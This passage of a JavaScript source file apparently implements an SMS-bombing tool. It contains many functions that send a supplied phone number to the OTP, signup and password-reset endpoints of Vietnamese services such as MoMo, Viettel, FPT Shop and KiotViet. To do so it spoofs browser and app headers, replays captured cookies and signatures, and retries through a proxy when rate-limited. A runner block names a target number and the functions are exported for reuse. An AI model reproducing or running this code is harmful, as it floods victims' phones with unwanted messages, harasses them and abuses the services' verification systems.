        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    }
    const data = {
        "phone": phone,
        "firstName": "Cac",
        "lastName": "Lo",
        "email": "kong@gmail.com",
        "password": "12345gdtg"
    }
    await axios.post(url, data, { headers })
        .then(response => {
            console.log('popeyes', response.data)
        })
        .catch(error => {
            console.error('popeyes Error:', error.response ? error.response.data : error.message);
        })

}

async function ALFRESCOS(phone) {
    const url = `https://api.alfrescos.com.vn/api/v1/User/SendSms`
    const headers = {
        'Host': 'api.alfrescos.com.vn',
        'accept': 'application/json, text/plain, */*',
        'brandcode': 'ALFRESCOS',
        'devicecode': 'web',
        'accept-language': 'vi-VN',
        'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'content-type': 'application/json',
        'origin': 'https://alfrescos.com.vn',
        'x-requested-with': 'mark.via.gp',
        'sec-fetch-site': 'same-site',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://alfrescos.com.vn/',
    }
    const data = {
        "phoneNumber": phone,
        "secureHash": "66148faf3cab6e527b8b044745e27dbd",
        "deviceId": "",
        "sendTime": 1693660146481,
        "type": 1
    }
    const params = {
        'culture': 'vi-VN',
    }
    await axios.post(url, params, data, { headers })
        .then(response => {
            console.log('popeyes', response.data)
        })
        .catch(error => {
            console.error('popeyes Error:', error.response ? error.response.data : error.message);
        })

}

async function VAYVND(phone) {
    const trackingId = "vQNViidUXnVDPxotPAMc2t5mypTYgrj0IH5pvhflaZGzdG77tD8sUh4uENsUKq7R";
    
    const headers = {
        "accept": "application/json",
        "accept-language": "vi-VN",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
        "site-id": "3",
        "content-type": "application/json; charset=utf-8",
        "origin": "https://vayvnd.vn",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://vayvnd.vn/",
        "priority": "u=1, i",
        "sec-ch-ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "Windows"
    };

    const trackSessionData = {
        tracking_id: trackingId,
        screen_resolution: {
            width: 1536,
            height: 864
        }
    };

    const resetPasswordData = {
        login: phone,
        trackingId: trackingId
    };

    try {
        // First API call
        const sessionResponse = await axios.post(
            'https://api.vayvnd.vn/v2/track-sessions',
            trackSessionData,
            { headers }
        );

        if (!sessionResponse.data.result) {
            throw new Error('Track session failed');
        }

        // Second API call
        try {
            const resetResponse = await axios.post(
                'https://api.vayvnd.vn/v2/users/password-reset',
                resetPasswordData,
                { headers }
            );

            if (resetResponse.data.result) {
                console.log("VAYVND thành công!");
                return true;
            }
        } catch (resetError) {
            if (resetError.response?.status === 429) {
                console.log('Đang thử lại với proxy...');
                
                try {
                    // Thử lại với proxy cho track session
                    const proxySessionResponse = await makeRequestWithProxy(
                        'https://api.vayvnd.vn/v2/track-sessions',
                        'POST',
                        trackSessionData,
                        { headers }
                    );
                    if (proxySessionResponse.result) {
                        // Thử lại với proxy cho reset password
                        const proxyResetResponse = await makeRequestWithProxy(
                            'https://api.vayvnd.vn/v2/users/password-reset',
                            'POST',
                            resetPasswordData,
                            { headers }
                        );

                        if (proxyResetResponse.result) {
                            console.log("VAYVND thành công với proxy!");
                            return true;
                        }
                    }
                } catch (proxyError) {
                    console.error('Lỗi khi sử dụng proxy:', 
                        proxyError.response?.data || proxyError.message
                    );
                    throw proxyError;
                }
            }
            throw resetError;
        }
    } catch (error) {
        // console.error('VAYVND Error:', 
        //     error.response?.data || error.message
        // );
        // throw error;
    }
    
    return false;
}

async function KIOTVIET(phone) {
    const url = `https://www.kiotviet.vn/wp-content/themes/kiotviet/TechAPI/getOTP.php`;
    const cookies = {
        'AKA_A2': 'A',
        'gkvas-uuid': 'b1b6bfdd-724e-449f-8acc-f3594f1aae3f',
        'gkvas-uuid-d': '1687347271111',
        'kvas-uuid': '1fdbe87b-fe8b-4cd5-b065-0900b3db04b6',
        'kvas-uuid-d': '1687347276471',
        'kv-session': '52268693-9db7-4b7d-ab00-0f5022612bc5',
        'kv-session-d': '1687347276474',
        '_fbp': 'fb.1.1687347277057.810313564',
        '_hjFirstSeen': '1',
        '_hjIncludedInSessionSample_563959': '1',
        '_hjSession_563959': 'eyJpZCI6IjI0OTRjOTA0LTEwYzQtNGVkMS04MGViLWFhZWRjZTg5Y2FmMSIsImNyZWF0ZWQiOjE2ODczNDcyNzcxNTYsImluU2FtcGxlIjp0cnVlfQ==',
        '_hjAbsoluteSessionInProgress': '1',
        '_tt_enable_cookie': '1',
        '_ttp': 'idt42AWvO5FQ_0j25HtJ7BSoA7J',
        '_gid': 'GA1.2.1225607496.1687347277',
        '_hjSessionUser_563959': 'eyJpZCI6ImRiOGYyMzEzLTdkMzItNTNmNi1hNWUzLTA4MjU5ZTE1MTRiOCIsImNyZWF0ZWQiOjE2ODczNDcyNzcxMzIsImV4aXN0aW5nIjp0cnVlfQ==',
        '_ga_6HE3N545ZW': 'GS1.1.1687347278.1.1.1687347282.56.0.0',
        '_ga_N9QLKLC70S': 'GS1.2.1687347283.1.1.1687347283.0.0.0',
        '_fw_crm_v': '4c8714f2-5161-4721-c213-fe417c49ae65',
        'parent': '65',
        '_ga': 'GA1.2.1568204857.1687347277',
    }

    const headers = {
        'authority': 'www.kiotviet.vn',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.kiotviet.vn',
        'referer': 'https://www.kiotviet.vn/dang-ky/',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    const data = {
        // 'phone': '+84'+ phone[1:],
        'code': 'bancainayne',
        'name': 'Cai Nit',
        'email': 'ahihi123982@gmail.com',
        'zone': 'An Giang - Huyện Châu Phú',
        'merchant': 'bancainayne',
        'username': phone,
        'industry': 'Điện thoại & Điện máy',
        'ref_code': '',
        'industry_id': '65',
        'phone_input': phone,
    }

    await axios.post(url, cookies, data, { headers })
        .then(response => {
            console.log('KIOTVIET', response.data)
        })
        .catch(error => {
            console.error('KIOTVIET Error:', error.response ? error.response.data : error.message);
        })

}

async function FPTSHOP(phone) {
    const url = `https://papi.fptshop.com.vn/gw/is/user/new-send-verification`;

    const headers = {
        'accept': '*/*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6',
        'apptenantid': 'E6770008-4AEA-4EE6-AEDE-691FD22F5C14',
        'content-type': 'application/json',
        'order-channel': 1,
        'origin': 'https://fptshop.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://fptshop.com.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': 'Windows',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36'
    }
    const data = {
        "fromSys": "WEBKHICT",
        "otpType": "0",
        "phoneNumber": phone
    }

    await axios.post(url, data, { headers })
        .then(response => {
            console.log('FPTSHOP', response.data)
        })
        .catch(error => {
            console.error('FPTSHOP Error:', error.response ? error.response.data : error.message);
        })

}

async function MOMO(phone) {
    const url = `https://api.momo.vn/public/auth/user/check`
    const headers = {
        'host': 'api.momo.vn',
        'userid': phone,
        'app_type': 'production',
        'accept': 'application/json',
        'momo-session-key-tracking': 'F6551578-B032-46D1-96D8-D6E01F4F71E6',
        'mtd': 'WVZhUI/GhdIz3k+HkTfoDolKLc5CUFHQ/meEt6mIqqqp9uOfx2i1v4YEHwmXhM/datlmwcejhbpD60pAlG6rWnyNSz7QBC7C/oI2Ooa4xy9daq815kIWhdumDUsz6V64HG4KfqMHSCeXDi3T0zwk/BMcvQRYhbcvuvyR/+5ZRwAfMwUAVC0owKw8whvJXkX9vo27ugiNQeN7ocjG5V3TMSCzvYpdqWHkhOzsNqbWQLLl42z5jHd4RkeX/n3Cs4aA+Z+6Zjem6FnRbBMYHcS4EMBHkz1lw84Di1p479c1ReKM1/S43b6VDTx801dxun0p7FNvLOKUi8v75YIf4ApDeaek4O4s6V8vyuuH2zNh4D+GaB0iLOvHpByLAzOlsvJFtFiZAaH03EmuPPUK0ITcjMAqjKD7AROuCoG4y6IJ23fJcfAfv1L4Uv7q1CKi/iw5KGy9PcTNsK4HFHGher/4SznU5iCIMgnjUtkDYM+dxMJj/tmwTLk4Wh2D+swSVPo4/tyFBPjVTiKzdt2j9Un2kQ==',
        'platform-timestamp': '1727063644624',
        'lang': 'vi',
        'user-agent': 'MoMoPlatform Store/4.2.2.42020 CFNetwork/1.0 Darwin/23.2.0 (iPhone 12 Pro Max iOS/17.2.1) AgentID/0',
        'agent_id': '0',
        'user_phone': phone,
        'accept-charset': 'UTF-8',
        'channel': 'APP',
        'ftv': '1&40200&1&(null)',
        'mky': 'Nh7kJUhcWhtHfXFtBMkH3L862Y6siU1GIYccerdLJ5rsXNDhpRzVmUzWgjxLSRR0aNEijuSrN+LM923zs3qLsNahL58s1QFzHVl4DfAozVpo4yjHZ79ahG/FJzYmtna2LFSwHyvQSNlBS45EhDb2WL6bZvsL8rHzl8KPFJuiFDftND3tkEqH0vUriI8m2vx+NVoAdGJtA6RrPgTUNuWvETf3iCmxIpC/xrug6YEGnFNTq1djbrPCTQLBKcSvZd83z52vb/rmNNVSwc/OirESsw2f2YAxtGcgikThYnA0NnuvmE4RVmvYWqpqTIPLVZ9JIVGVrZZVhhNMfHj5uWspBQ==',
        'accept-language': 'vi-VN,vi;q=0.9',
        'sentry-trace': '7f97b2816ba04586be6e6b779f856c16-ab27b1822b1e4807-0',
        'app_code': '4.2.2',
        'env': 'production',
        'vts': 'XObwZg==',
        'tbid': 'D7AE5D1E4CBD83F1BB38685BD6D1C5D6FBB4A81A',
        'content-type': 'application/json',
        'vcs': '7omIeQ==',
        'device_os': 'IOS',
        'vsign': 'VScnTxNO6rRzz3p7TRj0CEld6WwnZhSRpncd8skDayUWiP+G4g1YZd980++Lt2aj8zBeTW2ukf5wa0rlJ5Y8M8kmz8lYQ9Bd3Vl4tSwElgpx1UYukcspSJh7mHu+iExrILrQZfSDSjN3KoO3WZQEElbdWD44MWQyhCf/uWCSqtkt6P/YQgVInlWRoc0XwVcHIo10j4EWfjj35nI6vxSs0uute6s1HK5MIkt+lNib4rd2aka2HhfTAWHNjMEK60CfBDF8Gt7p3BCQ6rrF689rFIwT8fJV1IgY8MpEYkV7i5E4vNPAQqdIDXDLraJi2pNFT6nlofUaHQFp13d20C47Qg==',
        'timezone': 'Asia/Ho_Chi_Minh',
        'app_version': '42020',
        'baggage': 'sentry-environment=PRODUCTION,sentry-public_key=6e80c9f01f2440c9be5b37606028f996,sentry-release=vn.momo.platform.ios%404.2.2%2B42020,sentry-trace_id=7f97b2816ba04586be6e6b779f856c16'
    }
    const data = {
        "userId": phone,
        "msgType": "AUTH_USER_MSG",
        "time": 1727063644401,
        "appVer": 42020,
        "appCode": "4.2.2",
        "deviceOS": "ios",
        "buildNumber": 42020,
        "imei": "62B6C32C-245A-4730-AEEF-B6ACC7928B5C",
        "firmware": "17.2.1",
        "hardware": "iPhone",
        "rkey": "e0ad98de48128190bbf1596d29a3d46d",
        "isNFCAvailable": true
    }
    await axios.post(url, data, { headers })
        .then(response => {
            const errorCode = response.data.errorCode
            const riskId = response.data.riskId

            if (errorCode === 881200000) {
                const url = `https://api.momo.vn/public/auth/switcher/token/generate?riskId=${riskId}&methodCode=881200002&imei=62B6C32C-245A-4730-AEEF-B6ACC7928B5C`;
                const headers = {
                    'host': 'api.momo.vn',
                    'userid': phone,
                    'msgtype': 'GEN_METHOD_TOKEN_MSG',
                    'app_code': '4.2.2',
                    'user_phone': phone,
                    'option-key': 'QjeI5W3S2+q53I18cCCv0ofE/FVFFP66Tk9Xv78W8WvPkJL2SXrEGw==',
                    'user-id': phone,
                    'app_version': '42020',
                    'user-agent': 'MoMoPlatform Store/4.2.2.42020 CFNetwork/1.0 Darwin/23.2.0 (iPhone 12 Pro Max iOS/17.2.1) AgentID/0',
                    'lang': 'vi',
                    'channel': 'APP',
                    'momo-session-key-tracking': 'F6551578-B032-46D1-96D8-D6E01F4F71E6',
                    'baggage': 'sentry-environment=PRODUCTION,sentry-public_key=6e80c9f01f2440c9be5b37606028f996,sentry-release=vn.momo.platform.ios%404.2.2%2B42020,sentry-trace_id=7f97b2816ba04586be6e6b779f856c16',
                    'env': 'production',
                    'timezone': 'Asia/Ho_Chi_Minh',
                    'app_type': 'production',
                    'device_os': 'IOS',
                    'accept-language': 'vi-VN,vi;q=0.9',
                    'user-id': phone,
                    'accept-charset': 'UTF-8',
                    'accept': 'application/json',
                    'agent_id': '0',
                    'sentry-trace': '7f97b2816ba04586be6e6b779f856c16-ab27b1822b1e4807-0',
                    'platform-timestamp': '1727063649079'
                }
                axios.get(url, { headers })
                    .then(response => {
                        const result = response.data.riskMsg.result
                        const token = response.data.riskMsg.token
                        // const riskId = response.data.riskMsg.riskId
                        const cmId = response.data.cmdId
                        if (result) {
                            const url = `https://api.momo.vn/public/auth/otp/init?cmdId=${cmId}&rkey=3zO3tfITGn2wCfVlpTJe&firmware=ios`
                            const headers = {
                                'Host': 'api.momo.vn',
                                'userid': phone,
                                'accept': 'application/json',
                                'vversion': '3001',
                                'momo-session-key-tracking': 'F6551578-B032-46D1-96D8-D6E01F4F71E6',
                                'mtd': 'kj9Ohd7AxCMGR8ZpwHJg+52uomIBUS9Gspl5o8Pg+ElHYngH6hxQXQ9iGGeNjybbTROTtbk6+peO1LQ0ljfZXyuBF4e0xreY6QIk1LwCk3EV1QpdpI218GOAALQ1m7SVHVGJeW/FT+42J3jFftU9tcMoEnB30oIPuo6IXxMsunIFFHiu45hypKAOkdNjdux7w/TjW2td9OdXvN8nlH6pvTLlmAVRf0qdFG9t6WdEW1GmR/kN+VBg/lb2yEIYmmI+bV/O492ICwvKR3449r2Rf0VBMIzqKsy7na+ssBNIlp1XoDKTuSM6RTTzNLdEaXh3rOUFDBUkNSzUOXp1bWc4tSfdQ0dJDHXW5VkRtVFswGUpmxXgu76NyI32H2EntA60WF77zJgEvRHlsijEwCAU2sLsm4IFnrKOFfhiQ81Kxnyy1vdPIgMTpKil/jNlb7MjiVciK+rv0R9kiYPgqRQgUXakBYT6HnjM1aCSv9VfYBtrtIIAmLHPev1PJwlo9VYGyLu5ZoaMRww5yV+CHWFZ0g==',
                                'platform-timestamp': '1727063649396',
                                'lang': 'vi',
                                'user-agent': 'MoMoPlatform Store/4.2.2.42020 CFNetwork/1.0 Darwin/23.2.0 (iPhone 12 Pro Max iOS/17.2.1) AgentID/0',
                                'agent_id': '0',
                                'user_phone': phone,
                                'accept-charset': 'UTF-8',
                                'channel': 'APP',
                                'ftv': '1&40200&1&(null)',
                                'mky': 'H8aInxmJsTNvP62/NEcg6wFiPopxkVNmjBTGoLYF2SFo6KwMf8Ea9XDIi3AYQWwhz2gVTO5K2iCSBb+MXKOFg5PQgBkOlf7yKeL8tiCyqJW9jvQyhr/lH0OFg09Jq012NUS1iSVMOPm8F3x3fXZ4Hy184nLGVc0g23fHd4UGp7Z+D0lKCP/+kGI07Fl4TbeGUkhJeQfnessybS9gEuumgHkUfWztd6tA9XFGlBSyXSlBa/He1bE4LCiTuWK/6W31T3Fn/tYTJ2xCj2scUL+sft/pO736ziCwnKwt4Idur9a3K1SpwW+f+3/Mx1uVg4q+vET/Jk/qC0B7cFxU/6xR0g==',
                                'accept-language': 'vi-VN,vi;q=0.9',
                                'sentry-trace': '7f97b2816ba04586be6e6b779f856c16-ab27b1822b1e4807-0',
                                'app_code': '4.2.2',
                                'env': 'production',
                                'vts': 'YebwZg==',
                                'tbid': 'D7AE5D1E4CBD83F1BB38685BD6D1C5D6FBB4A81A',
                                'authorization': token,
                                'vcs': '7NX9ZA==',
                                'device_os': 'IOS',
                                'vsign': 'USBKJX3dPt0PIXyHIcgnPLCNgrwCdC9EQ05xjXxpWOAktE8ZZUC8KQXo0rtbrFRcJcVEGdehBr+OlCIWdz0s5bo87MId+7DZMGE+O23cKyKx0Pn968rAQNNIpAtBGZHIBtQvoehsWFxNuIiVBQQe0Nu43AHccitOVFzU2KvakOG+9o2vGcbUwc2bFfahsAB20YAFW2XgXUpwW0wsOEId5/qrgSjuaD3tdESiYivArbtsx2FosAmWQ+qBqvqt/kXJEIVND940VBgXpX7v/jFEfKh9fVEgmEBI2xeXMsIqYqvJ++W2XlKKIUB0mpowACmEhNnAHyRyBZlGclTtdNmKzw==',
                                'timezone': 'Asia/Ho_Chi_Minh',
                                'app_version': '42020',
                                'baggage': 'sentry-environment=PRODUCTION,sentry-public_key=6e80c9f01f2440c9be5b37606028f996,sentry-release=vn.momo.platform.ios%404.2.2%2B42020,sentry-trace_id=7f97b2816ba04586be6e6b779f856c16'
                            }
                            axios.get(url, { headers })
                                .then(response => {
                                    console.log('MOMO SENDVOICE', response.data)
                                })
                                .catch(error => {
                                    console.error('MOMO SENDVOICE Error:', error.response ? error.response.data : error.message);
                                })
                        }
                        // console.log('MOMO GETTOKEN', response.data)
                    })
                    .catch(error => {
                        console.error('MOMO GETTOKEN:', error.response ? error.response.data : error.message);
                    })

            }

            // console.log('MOMO', response.data)
        })
        .catch(error => {
            console.error('MOMO', error.response ? error.response.data : error.message);
        })
}

async function AHAMOVE(phone) {
    const url = `https://api.ahamove.com/api/v3/public/user/login`;

    const headers = {
        "Host": "api.ahamove.com",
        "accept": "*/*",
        "content-type": "application/json",
        "accepts-version": "2",
        "user-agent": "iOS/17.2.1 AhaMove_User/10.18(489372) Apple/iPhone13,4",
        "accept-language": "vi;q=1.0"
    }
    const data = {
        "firebase_sms_auth": true,
        "country_code": "VN",
        "resend": false,
        "type": "ios",
        "mobile": phone
    }

    await axios.post(url, data, { headers })
        .then(response => {
            console.log('AHAMOVE', response.data)
        })
        .catch(error => {
            console.error('AHAMOVE Error:', error.response ? error.response.data : error.message);
        })

}

async function cashbar(phone) {
    const headers = {
        'Host': 'api.cashbar.tech',
        // 'content-length': '73',
        'accept': 'application/json, text/plain, */*',
        'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://h5.cashbar.work',
        'x-requested-with': 'mark.via.gp',
        'sec-fetch-site': 'cross-site',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://h5.cashbar.work/',
        // 'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7'
    };

    const data = new URLSearchParams({
        'phone': phone,
        'type': '2',
        'ctype': '1',
        'chntoken': '7f38e65de6b47136eaa373feade6cd33'
    });

    axios.post('https://api.cashbar.tech/h5/LoginMessage_ultimate', data, { headers })
        .then(response => {
            console.log(response.data);
        })
        .catch(error => {
            console.error('Error:', error);
        });
}

async function shopiness(phone) {
    const cookies = {
        _gcl_au: '1.1.713290776.1691278322',
        _gid: 'GA1.2.538313268.1691278323',
        _gat_UA_78703708_2: '1',
        _ga: 'GA1.1.1304515259.1691278323',
        _fbp: 'fb.1.1691278324147.1207721038',
        _ga_P138SCK22P: 'GS1.1.1691278323.1.1.1691278362.21.0.0'
    };

    const headers = {
        'Host': 'shopiness.vn',
        'Connection': 'keep-alive',
        'Accept': '*/*',
        'X-Requested-With': 'XMLHttpRequest',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://shopiness.vn',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://shopiness.vn/khuyen-mai/pizza-hut-mua-1-tang-1-khi-giao-hang-tan-noi.80C793B3FC.html',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7'
    };

    const data = new URLSearchParams({
        action: 'verify-registration-info',
        phoneNumber: phone,
        refCode: ''
    });

    // Set cookie header manually as a string
    const cookieHeader = Object.entries(cookies)
        .map(([key, value]) => `${key}=${value}`)
        .join('; ');

    headers['Cookie'] = cookieHeader;

    axios.post('https://shopiness.vn/ajax/user', data, { headers })
        .then(response => {
            console.log(response.data);
        })
        .catch(error => {
            console.error(error);
        });
}




async function kiot(phone) {
    const cookies = {
        AKA_A2: 'A',
        'gkvas-uuid': 'b1b6bfdd-724e-449f-8acc-f3594f1aae3f',
        'gkvas-uuid-d': '1687347271111',
        'kvas-uuid': '1fdbe87b-fe8b-4cd5-b065-0900b3db04b6',
        'kvas-uuid-d': '1687347276471',
        'kv-session': '52268693-9db7-4b7d-ab00-0f5022612bc5',
        'kv-session-d': '1687347276474',
        _fbp: 'fb.1.1687347277057.810313564',
        _hjFirstSeen: '1',
        _hjIncludedInSessionSample_563959: '1',
        _hjSession_563959: 'eyJpZCI6IjI0OTRjOTA0LTEwYzQtNGVkMS04MGViLWFhZWRjZTg5Y2FmMSIsImNyZWF0ZWQiOjE2ODczNDcyNzcxNTYsImluU2FtcGxlIjp0cnVlfQ==',
        _hjAbsoluteSessionInProgress: '1',
        _tt_enable_cookie: '1',
        _ttp: 'idt42AWvO5FQ_0j25HtJ7BSoA7J',
        _gid: 'GA1.2.1225607496.1687347277',
        _hjSessionUser_563959: 'eyJpZCI6ImRiOGYyMzEzLTdkMzItNTNmNi1hNWUzLTA4MjU5ZTE1MTRiOCIsImNyZWF0ZWQiOjE2ODczNDcyNzcxMzIsImV4aXN0aW5nIjp0cnVlfQ==',
        _ga_6HE3N545ZW: 'GS1.1.1687347278.1.1.1687347282.56.0.0',
        _ga_N9QLKLC70S: 'GS1.2.1687347283.1.1.1687347283.0.0.0',
        _fw_crm_v: '4c8714f2-5161-4721-c213-fe417c49ae65',
        _ga: 'GA1.2.1568204857.1687347277',
    };

    const headers = {
        authority: 'www.kiotviet.vn',
        accept: 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        origin: 'https://www.kiotviet.vn',
        referer: 'https://www.kiotviet.vn/dang-ky/',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    };

    const data = new URLSearchParams({
        phone: '+84' + phone.slice(1), // Convert phone number
        code: 'bancainayne',
        name: 'Cai Nit',
        email: 'ahihi123982@gmail.com',
        zone: 'An Giang - Huyện Châu Phú',
        merchant: 'bancainayne',
        username: '0972936627',
        industry: 'Điện thoại & Điện máy',
        ref_code: '',
        industry_id: '65',
        phone_input: '0338607465',
    });

    // Create cookie header from cookies object
    const cookieHeader = Object.entries(cookies)
        .map(([key, value]) => `${key}=${value}`)
        .join('; ');

    headers['Cookie'] = cookieHeader;

    axios.post('https://www.kiotviet.vn/wp-content/themes/kiotviet/TechAPI/getOTP.php', data, { headers })
        .then(response => {
            console.log(response);
        })
        .catch(error => {
            console.error(error);
        });
}


async function dkvt(phone) {
    const cookies = {
        laravel_session: '7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2',
        __zi: '2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1',
        redirectLogin: 'https://viettel.vn/dang-ky',
        'XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
    };

    const headers = {
        Accept: 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        Connection: 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        Origin: 'https://viettel.vn',
        Referer: 'https://viettel.vn/dang-ky',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBK',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ==',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    };

    const jsonData = {
        msisdn: phone,
    };

    try {
        // Send POST request to get OTP
        const response = await axios.post('https://viettel.vn/api/get-otp', jsonData, { headers, withCredentials: true, params: cookies });
        console.log(response.data);
    } catch (error) {
        console.error('Error sending OTP:', error);
    }
}


async function bestInc(phoneNumber) {
    const headers = {
        Host: 'v9-cc.800best.com',
        Connection: 'keep-alive',
        'x-timezone-offset': '7',
        'x-auth-type': 'web-app',
        'x-nat': 'vi-VN',
        'x-lan': 'VI',
        authorization: 'null',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
        'Content-Type': 'application/json',
        Accept: 'application/json',
        'lang-type': 'vi-VN',
        Origin: 'https://best-inc.vn',
        'X-Requested-With': 'mark.via.gp',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        Referer: 'https://best-inc.vn/',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    };

    const data = {
        phoneNumber: phoneNumber,
        verificationCodeType: 1
    };

    try {
        // Send POST request to send signup code
        const response = await axios.post('https://v9-cc.800best.com/uc/account/sendsignupcode', data, { headers });
        console.log(response.data);
    } catch (error) {
        console.error('Error sending signup code:', error);
    }
}




// Example usage
(async () => {
    const phoneNumber = '0988282936';
    try {
        // await TV360(phoneNumber) // done
        // await Shine(phoneNumber); //done
        // await Momo(phoneNumber); // check
        // await hasaki(phoneNumber); // done
        // await MyVietel(phoneNumber) // done
        // await Futabus(phoneNumber)
        // await VIEON(phoneNumber)
        // await FPTPLAY2(phoneNumber)
        // await MyTV(phoneNumber)
        // await GalaxyPlay(phoneNumber)
        // await VIETTEL(phoneNumber)
        // await POPEYES(phoneNumber)
        // await ALFRESCOS(phoneNumber)
        // await VAYVND(phoneNumber)
        // await KIOTVIET(phoneNumber)
        // await FPTSHOP(phoneNumber)
        // await MOMO(phoneNumber)
        // await AHAMOVE(phoneNumber)
        // await cashbar(phoneNumber)
        // await shopiness(phoneNumber)
        // await kiot(phoneNumber)
        // await dkvt(phoneNumber)
        // await bestInc(phoneNumber);
    } catch (error) {
        console.error('Error processing requests:', error);
    }
})();

module.exports = {
    TV360,
    Shine,
    Momo,
    hasaki,
    MyVietel,
    Futabus,
    FTPplay,
    VIEON,
    FPTPLAY2,
